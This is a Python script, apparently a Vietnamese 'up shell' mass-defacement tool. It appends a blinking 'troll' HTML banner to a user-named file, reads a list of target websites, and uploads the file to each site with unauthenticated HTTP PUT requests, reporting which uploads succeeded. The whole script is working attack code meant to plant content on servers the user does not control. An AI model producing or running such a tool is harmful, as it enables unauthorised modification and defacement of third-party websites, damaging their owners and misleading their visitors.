#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
   import random
except ImportError:
   exit("install requests and try again ...")

banner = """
/***
 *    .__....__...................______...__..................__..__........________...................__.
 *    /..|../..|................./......\./..|................/..|/..|....../........|................./..|
 *    $$.|..$$.|..______......../$$$$$$..|$$.|____....______..$$.|$$.|......$$$$$$$$/______....______..$$.|
 *    $$.|..$$.|./......\.......$$.\__$$/.$$......\../......\.$$.|$$.|.........$$.|./......\../......\.$$.|
 *    $$.|..$$.|/$$$$$$..|......$$......\.$$$$$$$..|/$$$$$$..|$$.|$$.|.........$$.|/$$$$$$..|/$$$$$$..|$$.|
 *    $$.|..$$.|$$.|..$$.|.......$$$$$$..|$$.|..$$.|$$....$$.|$$.|$$.|.........$$.|$$.|..$$.|$$.|..$$.|$$.|
 *    $$.\__$$.|$$.|__$$.|....../..\__$$.|$$.|..$$.|$$$$$$$$/.$$.|$$.|.........$$.|$$.\__$$.|$$.\__$$.|$$.|
 *    $$....$$/.$$....$$/.......$$....$$/.$$.|..$$.|$$.......|$$.|$$.|.........$$.|$$....$$/.$$....$$/.$$.|
 *    .$$$$$$/..$$$$$$$/.........$$$$$$/..$$/...$$/..$$$$$$$/.$$/.$$/..........$$/..$$$$$$/...$$$$$$/..$$/.
 *    ..........$$.|.......................................................................................
 *    ..........$$.|.......................................................................................
 *    ..........$$/........................................................................................
 */
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         thanh_cong = ['Thành Công!!','Đã Xong!!','Hú ÝE!!','Ngon Lành!!']
         that_bai = ['Ui Hỏng!!','Thôi Xong!!','Lỗi Rồi!!','Thất Bại']
         random1 = random.choice(thanh_cong)
         random2 = random.choice(that_bai)
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" "+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" Thành Công!! "+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   
   while True:
      try:
         a = x("Nhập Tên File (có đuôi là .html): ")
         f = open(a,'a')
         hehe = '''
            <h1 class='troll'>hoc vien lam tro meo cua vduc</h1>
            <style>
                .troll {
                    font-family: sans-serif;
                    animation-name: color-troll;
                    animation: color-troll 1s infinite;
                }
                @keyframes color-troll {
              0% {
                color: black;
              }
              25% {
                color: transparent;
              }
              50% {
                color: black;
              }
              75% {
                color: transparent;
              }
              100% {
                color: black;
              }
            }
            </style>'''
         f.write(hehe)
         f.close()
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))

            continue
         else:
            
            break
            
      except KeyboardInterrupt:
         print; exit()
   
   aox(a)


if __name__ == "__main__":
    main(banner)
